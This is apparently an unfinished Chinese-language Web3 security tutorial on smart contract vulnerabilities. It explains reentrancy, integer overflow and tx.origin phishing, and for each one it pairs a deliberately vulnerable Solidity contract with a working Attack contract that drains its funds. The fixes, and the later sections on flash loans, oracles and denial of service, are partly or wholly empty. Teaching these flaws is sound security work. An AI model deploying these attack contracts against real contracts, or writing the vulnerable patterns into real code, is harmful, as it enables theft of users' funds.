# 智能合约常见漏洞

有人说，Web3就像《三体》中的“黑暗森林”，那么该课程将带你进入“猎人”的门。

**Twitter:** [@brycewai](https://twitter.com/brycewai)  
**Mirror:** [@Bryce.W](https://mirror.xyz/brycew.eth)  
**所有代码和教程开源在Github:** [https://github.com/brycewai/Web3-Security](https://github.com/brycewai/Web3-Security)

## 重入漏洞（Reentrancy）

### 漏洞介绍

调用外部合约的主要危险之一是它们可以接管控制流。在重入攻击（又名递归调用攻击）中，恶意合约在函数的第一次调用完成之前回调该调用合约，这可能会导致函数的重新进入逻辑处理，而此过程中如果没有进行状态变量的更新，则会导致重入攻击。

一些著名的重入攻击事件：

- 2016年，The DAO合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 ETH，并导致以太坊分叉为 ETH 链和 ETC（以太经典）链。
- 2019年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 sETH。
- 2020年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。
- 2021年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。
- 2022年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。

### 代码示例

[reentrancy.sol](./reentrancy.sol)

漏洞合约：  

```solidity
pragma solidity ^0.8.0;

contract Victim {
    mapping(address => uint256) public balanceOf; // 余额mapping

    // 存款，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提款，提取msg.sender的全部余额
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取msg.sender的余额
        require(balance > 0, "Insufficient balance"); // 要求余额大于0，才进行提款操作
        (bool success,) = msg.sender.call{value: balance}(""); // 调用call函数进行转账，将msg.sender的余额全部转到msg.sender账户里。这里有重入风险
        require(success, "Failed to send Ether"); // 要求call调用成功，才继续执行
        balanceOf[msg.sender] = 0; // 更新余额
    }

    // 获取合约本身的余额
    function getBalanceOfContract() external view returns (uint256) {
        return address(this).balance;
    }
}
```

攻击合约：  

```solidity
contract Attack {
    Victim public victim;

    constructor(Victim _victim) {
        victim = _victim;
    }

    // 回调函数，用于重入攻击Victim合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (victim.getBalanceOfContract() >= 1 ether) {
            victim.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function beginAttack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }
}
```

### 漏洞修复

- 使用 transfer() 函数
在可能的情况下，将ether发送给外部地址时使用solidity内置的transfer()函数，transfer()转账时只发送2300gas，不足以调用另一份合约（即重入发送合约）。  

- 检查-生效-交互模式（checks-effects-interactions）
确保状态变量改变发生在ether被发送（或者任何外部调用）之前，即Solidity官方推荐的“检查-生效-交互”模式。  

- 使用互斥锁
添加一个在代码执行过程中锁定合约的状态变量，防止重入调用

## 整型溢出（Integer Overflow and Underflow）

### 漏洞介绍

以太坊虚拟机（EVM）为整数指定固定大小的数据类型。这意味着每一个整型变量只能存储固定大小数值范围内的数。uint表示无符号数。
例如，一个uint8，只能存储范围[0,255]的数字。当一个uint8类型的变量值为255时，再进行加一，就会发生进位，导致整体翻转为零。
简单来说，就是Solidity整型变量被赋值高于或者低于可以表示的范围时，值会发生改变。  

溢出分为：

- 上溢：会溢出为0
- 下溢：会溢出为2^n – 1

根据运算形式又可以分为：

- 乘法溢出
- 加法溢出
- 减法溢出

### 代码示例

[overflow.sol](./overflow.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(type(uint256).max + 1 - timeLock.lockTime(address(this)));
        timeLock.withdraw();
    }
}

```

### 漏洞修复

- Solidity 0.8.0 之前的版本，在合约中引用 Safemath 库，在整型溢出时报错。
- 使用Solidity 0.8.0 之后的版本，其内置了 Safemath，因此几乎不存在这类问题。
- 慎用 unchecked，因为在 unchecked 修饰的代码块里面是不会对参数进行溢出检查的。

## tx.origin

### 漏洞介绍

tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初调用（或事务）的帐户的地址。在智能合约中使用此变量进行身份验证会使合约容易收到类似网络钓鱼的攻击。
这种钓鱼攻击的方式实际上就是中间人攻击的一种。  
在solidity中，使用tx.origin可以获得启动交易的原始地址，它与msg.sender十分相似，下面我们用一个例子来区分它们之间不同的地方。  
如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，msg.sender就是B合约，而tx.origin就是用户A。

### 代码示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Victim {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint256 _amount) public {
        require(tx.origin == owner, "Not owner");
        _to.transfer(_amount);
    }
}

contract Attack {
    address payable public hacker;
    Victim victim;

    constructor(Victim _victim) {
        victim = Victim(_victim);
        //将受益者地址赋值为部署者地址
        hacker = payable(msg.sender);
    }

    function attack() public {
        //诱导Victim合约的owner调用，于是Victim合约内的余额就全部转移到黑客地址中
        victim.transfer(hacker, address(victim).balance);
    }
}

```

attack()：攻击函数，该函数需要Victim合约的owner地址调用，owner调用攻击合约，攻击合约再调用Victim合约的transfer()函数，确认tx.origin == owner后，将Victim合约内的余额全部转移到黑客地址中。

### 漏洞修复

## 闪电贷攻击（Flashloan attack）

### 漏洞介绍

### 代码示例

### 漏洞修复

## 预言机操纵（Oracle Manipulation）

### 漏洞介绍

### 代码示例

### 漏洞修复

## 拒绝服务（Denial of Service, DoS）

### 漏洞介绍

### 代码示例

### 漏洞修复
